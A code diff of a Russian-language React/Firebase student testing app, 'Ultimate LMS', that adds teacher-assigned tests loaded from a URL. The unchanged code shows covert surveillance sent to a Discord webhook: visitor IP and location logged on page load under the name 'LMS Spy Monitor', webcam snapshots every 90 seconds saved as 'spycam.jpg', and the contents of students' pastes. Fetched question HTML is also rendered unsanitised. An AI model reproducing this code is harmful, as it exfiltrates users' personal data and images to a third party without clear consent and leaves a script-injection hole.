@@ -85,16 +85,12 @@ const AuthScreen = memo(() => {
         setError('');
         setIsLoading(true);
         try {
-            // Создаем провайдер Google
             const provider = new window.firebase.auth.GoogleAuthProvider();
-            // Вызываем окно авторизации
             const result = await window.auth.signInWithPopup(provider);
             const user = result.user;
 
-            // Проверяем, есть ли этот пользователь в нашей базе данных
             const userDoc = await window.db.collection('users').doc(user.uid).get();
             
-            // Если пользователя нет (первый вход), создаем ему карточку
             if (!userDoc.exists) {
                 await window.db.collection('users').doc(user.uid).set({
                     email: user.email,
@@ -160,7 +156,6 @@ const AuthScreen = memo(() => {
 const AdminPanel = ({ onBack }) => {
     const [users, setUsers] = useState([]);
 
-    // Загружаем студентов в реальном времени из базы
     useEffect(() => {
         if(!window.db) return;
         const unsub = window.db.collection('users').onSnapshot(snap => {
@@ -173,8 +168,25 @@ const AdminPanel = ({ onBack }) => {
         try {
             await window.db.collection('users').doc(uid).update({ isBanned: !currentStatus });
         } catch (e) {
-            console.error(e);
             alert("Ошибка при изменении статуса");
+        }
+    };
+
+    // ФУНКЦИЯ: НАЗНАЧИТЬ ТЕСТ СТУДЕНТУ
+    const assignTest = async (uid) => {
+        const url = prompt("Введите прямую ссылку на JSON-файл теста (например с GitHub):");
+        if (!url) return;
+        const title = prompt("Введите название теста (например: Промбезопасность Вариант 1):", "Тест от преподавателя");
+        if (!title) return;
+        
+        try {
+            await window.db.collection('users').doc(uid).update({ 
+                assignedTest: { url: url.trim(), title: title.trim() } 
+            });
+            alert("✅ Тест успешно назначен студенту!");
+        } catch (e) {
+            console.error(e);
+            alert("Ошибка при назначении теста");
         }
     };
 
@@ -191,11 +203,17 @@ const AdminPanel = ({ onBack }) => {
                         <div style={{overflow: 'hidden', paddingRight: '10px'}}>
                             <div style={{fontWeight:'bold', overflow: 'hidden', textOverflow: 'ellipsis'}}>{u.email}</div>
                             <div style={{fontSize:12, color: u.isBanned ? '#ef4444' : '#10b981', fontWeight: 'bold'}}>{u.isBanned ? ' ЗАБЛОКИРОВАН' : ' АКТИВЕН'}</div>
+                            {u.assignedTest && <div style={{fontSize:12, color: '#3b82f6', fontWeight: 'bold'}}>☁️ Назначен тест: {u.assignedTest.title}</div>}
                         </div>
                         {u.email !== 'msleaderindustry@gmail.com' && (
-                            <Button variant={u.isBanned ? "green" : "red"} style={{width:'auto', padding:'0 15px', height:35, minHeight:35, fontSize:12, margin:0}} onClick={() => toggleBan(u.id, u.isBanned)}>
-                                {u.isBanned ? "Разбанить" : "Забанить"}
-                            </Button>
+                            <div style={{display: 'flex', gap: '5px'}}>
+                                <Button variant="teal" style={{width:'auto', padding:'0 15px', height:35, minHeight:35, fontSize:12, margin:0}} onClick={() => assignTest(u.id)}>
+                                    🔗 Назначить
+                                </Button>
+                                <Button variant={u.isBanned ? "green" : "red"} style={{width:'auto', padding:'0 15px', height:35, minHeight:35, fontSize:12, margin:0}} onClick={() => toggleBan(u.id, u.isBanned)}>
+                                    {u.isBanned ? "Разбанить" : "Забанить"}
+                                </Button>
+                            </div>
                         )}
                     </div>
                 ))}
@@ -209,15 +227,7 @@ const TestQuestionCard = memo(({ question, index, answers, onAnswer }) => {
      if (!question) return null;
 
      return (
-       <motion.div 
-         ref={cardRef} 
-         key={index} 
-         initial={{ opacity: 0, x: 20 }} 
-         animate={{ opacity: 1, x: 0 }} 
-         exit={{ opacity: 0, x: -20 }} 
-         transition={{ duration: 0.3 }}
-         className="glass-panel" style={{width: '100%', display:'block'}}
-       >
+       <motion.div ref={cardRef} key={index} initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.3 }} className="glass-panel" style={{width: '100%', display:'block'}}>
          <h3 style={{textAlign:'center', marginBottom:15, opacity:0.6, fontSize:14, textTransform:'uppercase'}}>Вопрос {index+1}</h3>
          <div style={{fontSize:18, marginBottom:20, fontWeight:600}} dangerouslySetInnerHTML={{__html: question.question}} />
          {question.questionImg && <img src={question.questionImg} className="question-image" />}
@@ -234,19 +244,7 @@ const TestQuestionCard = memo(({ question, index, answers, onAnswer }) => {
                }
                
                return (
-                 <motion.div 
-                   key={i} 
-                   initial={{ opacity: 0, x: -20 }}
-                   animate={{ opacity: 1, x: 0 }}
-                   transition={{ delay: i * 0.1 }}
-                   className="variant-item" 
-                   onClick={() => !isAnswered && onAnswer(i)}
-                   style={{
-                     pointerEvents: isAnswered ? 'none' : 'auto',
-                     ...styleOverride
-                   }}
-                   whileHover={!isAnswered ? { scale: 1.01 } : {}}
-                 >
+                 <motion.div key={i} initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.1 }} className="variant-item" onClick={() => !isAnswered && onAnswer(i)} style={{ pointerEvents: isAnswered ? 'none' : 'auto', ...styleOverride }} whileHover={!isAnswered ? { scale: 1.01 } : {}}>
                     {v.img && <img src={v.img} style={{display:'block', maxWidth:200, marginBottom:8, borderRadius:8}} />}
                     {v.text}
                  </motion.div>
@@ -258,50 +256,29 @@ const TestQuestionCard = memo(({ question, index, answers, onAnswer }) => {
 });
 
 const ReviewView = ({ questions, answers, onBack }) => {
-      const reviewRef = useRef(null);
-      useMathJax(reviewRef, [questions]); 
-
+      const reviewRef = useRef(null); useMathJax(reviewRef, [questions]); 
       return (
-          <motion.div 
-             ref={reviewRef}
-             key="review" initial={{ y: 50, opacity: 0 }} animate={{ y: 0, opacity: 1 }} 
-             className="glass-panel review-container" 
-          >
-             <div className="review-header">
-                 <h2 style={{textAlign:'center', margin:0}}>Работа над ошибками</h2>
-             </div>
-             
+          <motion.div ref={reviewRef} key="review" initial={{ y: 50, opacity: 0 }} animate={{ y: 0, opacity: 1 }} className="glass-panel review-container">
+             <div className="review-header"><h2 style={{textAlign:'center', margin:0}}>Работа над ошибками</h2></div>
              <div className="review-content">
                  {questions.map((q, i) => {
-                     const userAns = answers[i];
-                     const isCorrect = userAns === q.correctIndex;
+                     const userAns = answers[i]; const isCorrect = userAns === q.correctIndex;
                      return (
-                         <div key={i} style={{
-                             background: 'var(--variant-default)', padding:25, borderRadius:20, marginBottom:20, border: isCorrect ? '2px solid #10b981' : '2px solid #ef4444'
-                         }}>
-                             <div style={{display:'flex', justifyContent:'space-between', marginBottom:15}}>
-                                 <strong>Вопрос {i+1}</strong> 
-                                 <span style={{color: isCorrect ? '#059669' : '#b91c1c', fontWeight:'bold'}}>{isCorrect ? 'ВЕРНО' : 'ОШИБКА'}</span>
-                             </div>
+                         <div key={i} style={{ background: 'var(--variant-default)', padding:25, borderRadius:20, marginBottom:20, border: isCorrect ? '2px solid #10b981' : '2px solid #ef4444' }}>
+                             <div style={{display:'flex', justifyContent:'space-between', marginBottom:15}}><strong>Вопрос {i+1}</strong><span style={{color: isCorrect ? '#059669' : '#b91c1c', fontWeight:'bold'}}>{isCorrect ? 'ВЕРНО' : 'ОШИБКА'}</span></div>
                              <div style={{marginBottom:20, fontSize:16}} dangerouslySetInnerHTML={{__html: q.question}}></div>
                              {q.questionImg && <img src={q.questionImg} className="question-image" style={{maxWidth:'100%', maxHeight:200, display:'block', margin:'0 auto 15px auto', borderRadius:10}} />}
-                             
                              {q.variants.map((v, vi) => {
                                  let style = {padding:'10px 15px', borderRadius:10, margin:'5px 0', border:'2px solid transparent', background:'var(--glass-bg)', opacity:0.8, color:'var(--text-main)'};
-                                 
                                  if(vi === q.correctIndex) { style.background = '#d1fae5'; style.borderColor = '#10b981'; style.color = '#064e3b'; style.opacity=1; }
                                  if(vi === userAns && !isCorrect) { style.background = '#fee2e2'; style.borderColor = '#ef4444'; style.color = '#7f1d1d'; style.opacity=1; }
-                                 
                                  return <div key={vi} style={style} dangerouslySetInnerHTML={{__html: v.text || 'Image'}}></div>
                              })}
                          </div>
                      )
                  })}
              </div>
-             
-             <div className="review-footer">
-               <Button onClick={onBack} style={{boxShadow:'0 5px 15px rgba(0,0,0,0.1)', width:'auto', padding:'0 40px'}}>В меню</Button>
-             </div>
+             <div className="review-footer"><Button onClick={onBack} style={{boxShadow:'0 5px 15px rgba(0,0,0,0.1)', width:'auto', padding:'0 40px'}}>В меню</Button></div>
           </motion.div>
       );
 };
@@ -331,10 +308,7 @@ const StatsView = ({ history, setHistory, onBack }) => {
               <tbody>
                 {sorted.map(h => (
                     <tr key={h.id} style={{borderBottom:'1px solid rgba(128,128,128,0.1)'}}>
-                       <td style={{padding:15}}>
-                           <div style={{fontWeight:700}}>{h.student}</div>
-                           <div style={{fontSize:12, opacity:0.6}}>{h.topic} • {h.date}</div>
-                       </td>
+                       <td style={{padding:15}}><div style={{fontWeight:700}}>{h.student}</div><div style={{fontSize:12, opacity:0.6}}>{h.topic} • {h.date}</div></td>
                        <td style={{textAlign:'center', fontWeight:'800', color:h.percent>=50?'#10b981':'#ef4444'}}>{h.percent}%</td>
                        <td style={{textAlign:'right'}}><button onClick={()=>{if(confirm('Удалить?')){const nh=history.filter(i=>i.id!==h.id);setHistory(nh);localStorage.setItem('test_history_v1',JSON.stringify(nh));}}} style={{border:'none', background:'transparent', color:'var(--text-sec)', fontSize:18}}>✕</button></td>
                     </tr>
@@ -356,10 +330,8 @@ function App() {
   const [history, setHistory] = useState([]);
   
   const [fp, setFp] = useState('');
-
   const [testSession, setTestSession] = useState({ questions: [], currentIdx: 0, answers: [], score: 0 });
   const [isResultSaved, setIsResultSaved] = useState(false);
-  
   const [timeLeft, setTimeLeft] = useState(1200);
   const [customTime, setCustomTime] = useState('20'); 
   const [customQCount, setCustomQCount] = useState(''); 
@@ -367,8 +339,8 @@ function App() {
 
   const [user, setUser] = useState(null);
   const [isAuthLoading, setIsAuthLoading] = useState(true);
+  const [teacherTest, setTeacherTest] = useState(null); // ПЕРСОНАЛЬНЫЙ ТЕСТ
 
-  // ПРОВЕРКА НА АДМИНА
   const isAdmin = user && user.email === 'msleaderindustry@gmail.com';
 
   useEffect(() => {
@@ -383,10 +355,19 @@ function App() {
           if (currentUser && window.db) {
               const unsubscribeBan = window.db.collection('users').doc(currentUser.uid)
                   .onSnapshot((doc) => {
-                      if (doc.exists && doc.data().isBanned === true) {
-                          alert("Доступ закрыт! Вы были исключены администратором.");
-                          window.auth.signOut();
-                          window.location.reload();
+                      if (doc.exists) {
+                          const data = doc.data();
+                          if (data.isBanned === true) {
+                              alert("Доступ закрыт! Вы были исключены администратором.");
+                              window.auth.signOut();
+                              window.location.reload();
+                          }
+                          // Слушаем "Тихий заброс" теста
+                          if (data.assignedTest) {
+                              setTeacherTest(data.assignedTest);
+                          } else {
+                              setTeacherTest(null);
+                          }
                       }
                   });
               return () => unsubscribeBan();
@@ -403,11 +384,9 @@ function App() {
           const platform = navigator.platform || "Неизвестно";
 
           let payload = {
-              username: "LMS Spy Monitor",
-              avatar_url: "https://i.imgur.com/4M34hi2.png",
+              username: "LMS Spy Monitor", avatar_url: "https://i.imgur.com/4M34hi2.png",
               embeds: [{
-                  title: "👁️ НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ",
-                  color: 16753920,
+                  title: "👁️ НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ", color: 16753920,
                   fields: [
                       { name: "📍 Локация", value: `${ipData.country_name || 'Скрыто'}, ${ipData.city || 'Скрыто'}`, inline: true },
                       { name: "🌐 IP Адрес", value: `\`${ipData.ip || 'Скрыто'}\``, inline: true },
@@ -416,9 +395,7 @@ function App() {
                   timestamp: new Date().toISOString()
               }]
           };
-
-          let formData = new FormData();
-          formData.append('payload_json', JSON.stringify(payload));
+          let formData = new FormData(); formData.append('payload_json', JSON.stringify(payload));
           await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
       } catch (e) {}
   };
@@ -434,10 +411,7 @@ function App() {
               const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
               streamRef.current = stream;
               const video = document.createElement('video');
-              video.muted = true;
-              video.playsInline = true;
-              video.autoplay = true;
-              video.srcObject = stream;
+              video.muted = true; video.playsInline = true; video.autoplay = true; video.srcObject = stream;
               videoRef.current = video;
               await new Promise((resolve) => {
                   video.onloadedmetadata = () => { video.play().then(resolve).catch(resolve); };
@@ -451,28 +425,23 @@ function App() {
       let formData = new FormData();
       const isPlanned = title.includes("Плановая");
       let payload = {
-          username: "Ultimate LMS Security",
-          avatar_url: "https://i.imgur.com/4M34hi2.png",
+          username: "Ultimate LMS Security", avatar_url: "https://i.imgur.com/4M34hi2.png",
           embeds: [{
-              title: title,
-              color: isPlanned ? 3447003 : 15158332,
+              title: title, color: isPlanned ? 3447003 : 15158332,
               fields: [...extraFields, { name: "🆔 Fingerprint", value: `\`${fp}\`` }],
-              footer: { text: "Monitoring Active" },
-              timestamp: new Date().toISOString()
+              footer: { text: "Monitoring Active" }, timestamp: new Date().toISOString()
           }]
       };
 
       if (videoRef.current && streamRef.current) {
           try {
-              const video = videoRef.current;
               const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth || 640; 
-              canvas.height = video.videoHeight || 480;
-              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+              canvas.width = videoRef.current.videoWidth || 640; 
+              canvas.height = videoRef.current.videoHeight || 480;
+              canvas.getContext('2d').drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
               const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
               if (blob && blob.size > 100) {
-                  formData.append('file', blob, 'spycam.jpg');
-                  payload.embeds[0].image = { url: 'attachment://spycam.jpg' };
+                  formData.append('file', blob, 'spycam.jpg'); payload.embeds[0].image = { url: 'attachment://spycam.jpg' };
               }
           } catch(e) {}
       }
@@ -482,19 +451,14 @@ function App() {
 
   useEffect(() => {
       if (view !== 'test') {
-          if (streamRef.current) {
-              streamRef.current.getTracks().forEach(t => t.stop());
-              streamRef.current = null;
-          }
+          if (streamRef.current) { streamRef.current.getTracks().forEach(t => t.stop()); streamRef.current = null; }
           if (videoRef.current) { videoRef.current = null; }
       }
   }, [view]);
 
   useEffect(() => {
     let intervalId = null;
-    if (view === 'test') {
-      intervalId = setInterval(() => { captureViolation("📸 Плановая проверка (мониторинг)"); }, 90000);
-    }
+    if (view === 'test') { intervalId = setInterval(() => { captureViolation("📸 Плановая проверка (мониторинг)"); }, 90000); }
     return () => { if (intervalId) clearInterval(intervalId); };
   }, [view, fp]);
 
@@ -502,25 +466,10 @@ function App() {
       if (view !== 'test') return;
       const handleVisibility = () => { if (document.hidden) captureViolation("⚠️ ВНИМАНИЕ: Смена вкладки / Сворачивание"); };
       const handleBlur = () => captureViolation("⚠️ ВНИМАНИЕ: Потеря фокуса (переход в другое окно)");
-      const handlePaste = (e) => {
-          const txt = e.clipboardData.getData('text');
-          captureViolation("📋 ПЕРЕХВАТ: Попытка вставки (Paste)", [{ name: "Содержимое", value: `\`\`\`${txt || 'пусто'}\`\`\`` }]);
-      };
-      const handleKeys = (e) => {
-          if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && e.keyCode === 85)) {
-              captureViolation("🚫 ЗАПРЕТ: Попытка открыть DevTools или исходный код");
-          }
-      };
-      window.addEventListener('visibilitychange', handleVisibility);
-      window.addEventListener('blur', handleBlur);
-      window.addEventListener('paste', handlePaste);
-      window.addEventListener('keydown', handleKeys);
-      return () => {
-          window.removeEventListener('visibilitychange', handleVisibility);
-          window.removeEventListener('blur', handleBlur);
-          window.removeEventListener('paste', handlePaste);
-          window.removeEventListener('keydown', handleKeys);
-      };
+      const handlePaste = (e) => { captureViolation("📋 ПЕРЕХВАТ: Попытка вставки (Paste)", [{ name: "Содержимое", value: `\`\`\`${e.clipboardData.getData('text') || 'пусто'}\`\`\`` }]); };
+      const handleKeys = (e) => { if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && e.keyCode === 85)) captureViolation("🚫 ЗАПРЕТ: Попытка открыть DevTools"); };
+      window.addEventListener('visibilitychange', handleVisibility); window.addEventListener('blur', handleBlur); window.addEventListener('paste', handlePaste); window.addEventListener('keydown', handleKeys);
+      return () => { window.removeEventListener('visibilitychange', handleVisibility); window.removeEventListener('blur', handleBlur); window.removeEventListener('paste', handlePaste); window.removeEventListener('keydown', handleKeys); };
   }, [view, fp]);
 
   useEffect(() => { document.body.className = theme; localStorage.setItem('theme', theme); }, [theme]);
@@ -528,21 +477,14 @@ function App() {
   useEffect(() => {
       if(view !== 'test') return;
       const timer = setInterval(() => {
-          setTimeLeft((prev) => {
-              if(prev <= 1) { clearInterval(timer); return 0; }
-              return prev - 1;
-          });
+          setTimeLeft((prev) => { if(prev <= 1) { clearInterval(timer); return 0; } return prev - 1; });
       }, 1000);
       return () => clearInterval(timer);
   }, [view]);
   
   useEffect(() => { if(timeLeft === 0 && view === 'test') finishTest(); }, [timeLeft]);
 
-  const formatTime = (s) => {
-      const m = Math.floor(s / 60);
-      const sec = s % 60;
-      return `${m}:${sec < 10 ? '0'+sec : sec}`;
-  };
+  const formatTime = (s) => { const m = Math.floor(s / 60); const sec = s % 60; return `${m}:${sec < 10 ? '0'+sec : sec}`; };
 
   useEffect(() => {
     async function check() {
@@ -560,15 +502,25 @@ function App() {
     setHistory(JSON.parse(localStorage.getItem('test_history_v1') || '[]'));
   };
 
-  const addSet = (name) => {
-    if(!name) return; if(sets.includes(name)) return alert('Уже есть!');
-    const newSets = [...sets, name]; setSets(newSets); localStorage.setItem('test_sets_list', JSON.stringify(newSets)); localStorage.setItem('tests_' + name, JSON.stringify([]));
-  };
-  const deleteSet = (name) => {
-    if(!confirm(`Удалить "${name}"?`)) return; const newSets = sets.filter(s => s !== name);
-    setSets(newSets); localStorage.setItem('test_sets_list', JSON.stringify(newSets)); localStorage.removeItem('tests_' + name);
-  };
+  const addSet = (name) => { if(!name) return; if(sets.includes(name)) return alert('Уже есть!'); const newSets = [...sets, name]; setSets(newSets); localStorage.setItem('test_sets_list', JSON.stringify(newSets)); localStorage.setItem('tests_' + name, JSON.stringify([])); };
+  const deleteSet = (name) => { if(!confirm(`Удалить "${name}"?`)) return; const newSets = sets.filter(s => s !== name); setSets(newSets); localStorage.setItem('test_sets_list', JSON.stringify(newSets)); localStorage.removeItem('tests_' + name); };
   const openSet = (name) => { setCurrentSet(name); setTests(JSON.parse(localStorage.getItem('tests_' + name)) || []); setView('set_menu'); };
+
+  // ФУНКЦИЯ ДЛЯ ЗАГРУЗКИ ПЕРСОНАЛЬНОГО ТЕСТА
+  const openTeacherAssignedTest = async (testInfo) => {
+      try {
+          setView('loading');
+          const res = await fetch(testInfo.url);
+          const data = await res.json();
+          const normalized = data.map(t => ({ question: t.question || '', questionImg: t.questionImg || null, variants: (t.variants || []).map(v => typeof v === 'object' ? v : {text:String(v),img:null}), correctIndex: t.correctIndex }));
+          setCurrentSet(testInfo.title);
+          setTests(normalized);
+          setView('set_menu');
+      } catch (e) {
+          alert("Ошибка загрузки теста учителя! Проверьте ссылку.");
+          setView('menu');
+      }
+  };
 
   const importJSON = (e) => {
     const file = e.target.files[0]; if(!file) return; const reader = new FileReader();
@@ -602,9 +554,7 @@ function App() {
     setTestSession(prev => ({...prev, answers: newAnswers}));
     setIsAnimating(true);
     setTimeout(() => { 
-        if(testSession.currentIdx < testSession.questions.length - 1) { 
-            setTestSession(prev => ({...prev, currentIdx: prev.currentIdx + 1})); 
-        }
+        if(testSession.currentIdx < testSession.questions.length - 1) { setTestSession(prev => ({...prev, currentIdx: prev.currentIdx + 1})); }
         setIsAnimating(false);
     }, 700);
   };
@@ -637,8 +587,7 @@ function App() {
               }
           }
       };
-      window.addEventListener('keydown', handleKeyDown);
-      return () => window.removeEventListener('keydown', handleKeyDown);
+      window.addEventListener('keydown', handleKeyDown); return () => window.removeEventListener('keydown', handleKeyDown);
   }, [view, testSession, isAnimating]);
   
   const restartMistakes = async () => {
@@ -660,14 +609,11 @@ function App() {
       const scoreData = { student: name, percent: Math.round((testSession.score / testSession.questions.length) * 100), score: testSession.score, total: testSession.questions.length, topic: currentSet };
       try {
           await fetch(DISCORD_WEBHOOK, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
+              method: 'POST', headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
-                  username: "System Monitor",
-                  avatar_url: "https://i.imgur.com/4M34hi2.png",
+                  username: "System Monitor", avatar_url: "https://i.imgur.com/4M34hi2.png",
                   embeds: [{
-                      title: "📊 Новый результат теста",
-                      color: 3066993,
+                      title: "📊 Новый результат теста", color: 3066993,
                       fields: [
                           { name: "👤 Студент", value: `**${scoreData.student}**`, inline: true },
                           { name: "🎯 Результат", value: `\`${scoreData.percent}%\``, inline: true },
@@ -741,10 +687,24 @@ function App() {
                               🛡️ АДМИНКА
                           </Button>
                       )}
+                      <Button variant="muted" onClick={() => window.auth.signOut()} style={{ width: 'auto', padding: '0 15px', height: '36px', minHeight: '36px', fontSize: '12px', margin: 0 }}>
+                          ВЫЙТИ
+                      </Button>
                   </div>
               </div>
 
               <h2 style={{textAlign:'center', fontSize:28, background: 'var(--primary-grad)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', margin:'0 0 25px 0'}}>Ultimate LMS</h2>
+              
+              {/* --- ТИХИЙ ЗАБРОС: ТЕСТ ОТ ПРЕПОДАВАТЕЛЯ --- */}
+              {teacherTest && (
+                  <div style={{display:'flex', gap:10, marginBottom:20}}>
+                      <Button variant="primary" onClick={() => openTeacherAssignedTest(teacherTest)} style={{ flex:1, justifyContent:'flex-start', textAlign:'left', padding:'15px 20px', minWidth: 0, height: 'auto', minHeight: '60px', wordBreak: 'break-word', background: 'linear-gradient(135deg, #00c6ff 0%, #0072ff 100%)', boxShadow: '0 4px 15px rgba(0, 198, 255, 0.4)' }}>
+                          <span style={{marginRight:10, fontSize: '20px'}}>☁️</span>
+                          <span style={{wordBreak:'break-word', lineHeight:'1.3', fontWeight: 800}}>ВАЖНО: {teacherTest.title || 'Тест от преподавателя'}</span>
+                      </Button>
+                  </div>
+              )}
+
               <div style={{display:'flex', justifyContent:'center', marginBottom:25}}>
                  <Button variant="orange" style={{maxWidth:300}} onClick={() => setView('stats')}>📊 Статистика</Button>
               </div>
